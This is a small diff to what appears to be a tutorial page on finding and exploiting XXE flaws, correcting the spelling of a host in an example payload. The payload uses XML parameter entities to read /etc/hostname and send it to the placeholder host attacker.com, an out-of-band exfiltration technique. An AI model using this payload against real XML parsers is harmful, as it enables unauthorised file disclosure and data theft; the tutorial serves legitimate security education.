@@ -78,7 +78,7 @@ description: "Learn to detect and exploit XXE (XML External Entity) vulnerabilit
 
     ```xml
     <!ENTITY % file SYSTEM "file:///etc/hostname">
-    <!ENTITY % stack "<!ENTITY &#x25; exfil SYSTEM 'http://attaccker.com/?x=%file;'>">
+    <!ENTITY % stack "<!ENTITY &#x25; exfil SYSTEM 'http://attacker.com/?x=%file;'>">
     %stack;
     %exfil;
     ```
